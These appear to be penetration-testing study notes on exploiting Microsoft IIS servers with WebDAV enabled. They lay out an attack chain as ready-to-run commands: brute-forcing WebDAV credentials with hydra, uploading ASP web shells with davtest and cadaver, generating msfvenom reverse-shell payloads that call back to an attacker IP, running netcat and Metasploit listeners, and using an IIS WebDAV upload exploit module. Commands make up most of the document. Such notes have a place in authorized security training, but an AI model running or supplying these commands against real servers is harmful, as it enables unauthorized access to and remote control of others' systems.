
###### MS IIS 
-> web server to host a web application , 
-> supports `.asp` `.aspx` `.config` `.php`

###### WebDAV
-> It is an extension , which help a web server (MS IIS) act as a file server in order to DELETE , UPLOAD , CREATE , MOVE files on a web server.
-> It also facilitates authentication , we need USER/PASS to get into it.


##### WebDAV Exploitation
1. First , identify whether it is configure to MS IIS or NOT
	-> use nmap's `http-enum.nse` script
2. if YES , then Brute-Force the credentials in order to get into the server
3. After that , upload a malicious `.asp` file , used to execute arbitrary commands and get a Reverse Shell.


###### Tools
1. `davtest` : used to scan , auth & exploit a DAV server.
	-> `davtest -url http://IP/webdav`  #without authentication
	 -> `davtest -auth user:pass -url http://ip/webdev` #With authentication
	-> give info about which filetypes can be upload , is directory writeable or not etc.

2. `cadaver` : It supports , file uploads , download , on screen display , in place editing , name-space operation (move/copy) , collection creation & deletion , property manipulation & resource locking on DAV servers.
	-> `cadaver http://IP/webdav` : fill user and password in prompt and use `put`
	command to upload a file like `.asp` reverse shell.
	-> */usr/share/webshells/asp/webshell.asp*

--> _NOTE_  :  Use hydra to Brute Force WEBDAV user/pass.
```
hydra -L /usr/share/wordlists/metasploit/common_users.txt -P /usr/share/wordlists/metasploit/common_passwords.txt <IP> http-get /webdav/
```
If SSL enable 
```
hydra -L users.txt -P passwords.txt -s 443 -S target.com https-get /webdav
```


#### Create a `asp` payload using `msfvenom`
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=6969 -f asp > exploit.asp
```
##### Start Listener (`msfconsole`)
```
msfconsole -q
use exploit/multi/handler 
set payload windows/meterpreter/reverse_tcp
set lhost <attacker_ip>
set lport 6969
exploit
```

#### Create payload and listen using `netcat` 
```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.160.32 LPORT=1234 -f asp > exploit.asp

---------------------------------------------------------------------

msfvenom -p windows/shell_reverse_tcp LHOST=192.168.160.32 LPORT=1234 -f aspx > exploit.aspx
```
##### Start Listener using `nc`
```
nc -lvnp 1234
```
###### Upload reverse shell
```
put /usr/share/webshells/asp/webshell.asp
```

##### Exploit using `msfconsole`
search payload `search iis upload`
`use exploit/windows/iis/iis_webdav_upload_asp`
`show options`
`set HttpUsername bob`
`set HttpPassword password_123321`
`set lhost <attacker_ip>`
`set lport 4444`
`set SSL true` #Opptional set it true if the port number is 443 instead of 80
`set path /Path/exploit.asp`
`exploit`


